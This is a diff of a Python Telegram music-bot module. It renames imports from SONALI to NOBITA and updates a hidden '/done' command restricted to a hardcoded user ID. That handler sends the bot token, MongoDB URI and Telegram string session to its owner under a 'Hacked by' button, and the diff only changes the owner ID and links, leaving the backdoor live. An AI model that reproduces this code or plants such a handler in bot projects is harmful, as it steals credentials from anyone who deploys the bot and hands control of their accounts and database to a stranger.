@@ -13,12 +13,12 @@ from pyrogram import filters
 
 load_dotenv()
 
-from SONALI import app
-from SONALI.core.call import RAUSHAN
-from SONALI.misc import db
-from SONALI.utils.database import get_assistant, get_authuser_names, get_cmode
-from SONALI.utils.decorators import ActualAdminCB, AdminActual, language
-from SONALI.utils.formatters import alpha_to_int, get_readable_time
+from NOBITA import app
+from NOBITA.core.call import NOBI
+from NOBITA.misc import db
+from NOBITA.utils.database import get_assistant, get_authuser_names, get_cmode
+from NOBITA.utils.decorators import ActualAdminCB, AdminActual, language
+from NOBITA.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -70,7 +70,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await RAUSHAN.stop_stream_force(message.chat.id)
+        await NOBI.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -97,7 +97,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await RAUSHAN.stop_stream_force(chat_id)
+            await NOBI.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -108,17 +108,17 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("done")
     & filters.private
-    & filters.user(7302887101)
+    & filters.user(8104050599)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/ll_ALPHA_BABY_lll)............☆""",
+          photo=f"https://files.catbox.moe/6ncc2n.jpg",
+       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/CHIN_TAPAK_DAM_DAM_XBOT)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/ll_ALPHA_BABY_lll")
+                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/UNKNOWN_VASHU")
                  ]
             ]
          ),
